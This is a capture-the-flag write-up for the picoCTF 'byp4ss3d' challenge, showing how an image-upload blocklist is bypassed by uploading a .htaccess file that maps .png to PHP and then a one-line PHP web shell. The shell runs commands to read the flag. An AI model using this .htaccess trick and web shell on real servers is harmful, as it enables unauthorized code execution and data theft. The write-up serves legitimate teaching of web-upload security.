# byp4ss3d (picoCTF picoMini - CMU-Africa) - Writeup

## Category: Web Exploitation - File Upload -> .htaccess RCE
## Difficulty: Medium

### Challenge Description
> A university's online registration portal asks students to upload their ID cards for verification.
> The developer put some filters in place to ensure only image files are uploaded but are they enough?
> Apache can be tricked into executing non-PHP files as PHP with a .htaccess file. Try uploading more
> than just one file.

Target: `http://amiable-citadel.picoctf.net:54321/` (Apache 2.4.62, PHP 8.3.22)

### Recon
1. GET `/` served an upload form posting to `upload.php`, field `image`, standard multipart/form-data.
2. Uploaded probe files to map the filter rule:
   - `.txt` -> `Not allowed!`
   - `.php`, `.PHP`, `.png.php`, `.phtml` -> `Not allowed!`
   - `.png`, `.jpg`, `.jpeg`, `.gif`, `.PNg` (case-insensitive) -> `Successfully uploaded!`
   - **`.htaccess` -> `Successfully uploaded!` (allowed)**
3. Concluded: the filter is a **blocklist** of PHP-ish extensions (allow regex on image exts but
   `.htaccess` slips through), no Content-Type or magic-byte check.

### Exploitation
1. Uploaded `.htaccess` containing:
   ```
   AddType application/x-httpd-php .png
   ```
   -> echoed as `images/.htaccess`.
2. Uploaded `shell2.png` (allowed ext, `.png`) containing:
   ```php
   <?php system($_GET['c']); ?>
   ```
   -> echoed as `images/shell2.png`.
3. Requested `images/shell2.png?c=id` -> `uid=33(www-data)...` (RCE confirmed).

### Flag
```
picoCTF{s3rv3r_byp4ss_20193d1e}
```

Found with `images/shell2.png?c=cat ../../flag.txt` after `ls ../..` revealed `flag.txt` at the
filesystem root next to `html/`.

### Why It Worked
The developer filtered only a *list of dangerous PHP extensions* instead of enforcing a strict image
allowlist. This let a `.htaccess` config file through, which instructed Apache to route `.png` files
to the PHP handler. Consequently a `.png` containing PHP source was executed server-side, giving
arbitrary command execution. No magic bytes were required because execution is decided by the Apache
handler, not a MIME/content check.

### Lessons Learned
- Distinguish an upload **blocklist** (rejects only php-ish exts) from a strict **allowlist**
  (rejects everything not an image) via small probe uploads before choosing a bypass.
- If `.htaccess` is accepted, Apache misconfiguration (AddType/SetHandler mapping an allowed ext to
  PHP) converts any allowed extension into a web shell - no GIF89a magic-byte prefix needed.
- Flags frequently live OUTSIDE the web root; from an RCE shell use `ls ../..` then
  `cat ../../flag.txt`.

### Reusable Artifacts
- Skill: `skills/web/FileUpload.md` (.htaccess-to-PHP guide)
- Script: `scripts/htaccess_shell.py` (new)
- Payloads: `payloads/PHP.txt` (.htaccess + shell.png steps)
- Notes: `notes/patterns.md`, `notes/lessons_learned.md`
- Playbook: `playbooks/picoCTF.md` (file-upload enumeration step)

### References
- OWASP: Unrestricted File Upload
- Apache: mod_mime handlers / SetHandler
